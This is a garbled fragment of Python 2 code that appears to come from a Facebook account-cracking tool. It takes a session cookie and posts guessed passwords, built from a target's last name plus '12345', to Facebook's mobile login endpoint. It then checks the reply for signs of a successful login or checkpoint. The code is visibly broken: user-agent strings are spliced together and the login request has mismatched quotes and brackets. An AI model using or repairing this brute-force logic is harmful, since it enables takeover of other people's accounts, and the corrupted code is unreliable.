...
def cookie():
	...
	try:
		cookie = raw_input("\n   [•] Cookie : ")
		data = {
		            'user-agent' : 'Mozilla/5.0 (X11; Linux x 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.2; P023 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Safari/537.36',86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
		...
		try:
			...
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				...
				if 'checkpoint' in xo:
					...
					pass3 = c['last_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass2, pass3"login" : "submit"}, headers = { 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.2; P023 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Safari/537.36',)}]
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
